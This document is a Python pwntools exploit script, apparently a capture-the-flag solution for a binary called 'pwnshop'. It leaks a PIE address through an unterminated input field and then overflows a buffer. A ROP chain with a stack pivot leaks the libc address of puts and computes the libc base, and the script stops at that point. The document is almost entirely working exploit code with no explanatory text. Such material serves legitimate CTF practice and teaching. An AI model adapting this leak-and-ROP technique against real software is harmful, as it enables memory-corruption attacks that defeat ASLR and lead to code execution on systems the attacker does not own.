#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
piebase
breakrva 0x132a
continue
'''.format(**locals())

# Binary filename
exe = './pwnshop'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

libc = elf.libc

# Send the payload
io.sendlineafter('>', '2')
io.sendlineafter('What do you wish to sell?', 'lol')
io.sendlineafter('How much do you want for it?', 'A' * 7)  # Leak address
io.recvuntil('A\n')
leaked = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("Leaked address: %#x", leaked)

elf.address = leaked - 0x40c0 # .bss - &DAT_001040c0
info('ELF pie base address %#x', elf.address)

offset = 72

# Gadgets
pop_rdi = 0x13c3  # pop rdi; ret;
sub_rsp = 0x1219  # sub rsp, 0x28; ret;
ret = 0x101a # ret; 


# Build up rop chain to leak got.puts()
rop_chain = flat([
    elf.address + pop_rdi,  
    elf.got.puts,
    elf.plt.puts,  
    elf.address + 0x132a  # Return to "Buy" (1)
])

# Calculate padding
padding = (offset - len(rop_chain))

# Payload to increase stack space and leak libc foothold
payload = flat({
    padding: [
        rop_chain,  # Leak got.puts
        elf.address + sub_rsp  # Go back 28 bytes (to rop_chain)
    ]
})

io.sendline('1') 
io.sendlineafter('Enter details:', payload)

# Get our leaked puts address
puts_got = unpack(io.recvline()[1:7] + b"\x00"*2)
info("Puts got address %#x", puts_got)

# Calculate libc base address
libc.address = puts_got - libc.symbols['puts']
info("Libc base address %#x", libc.address)
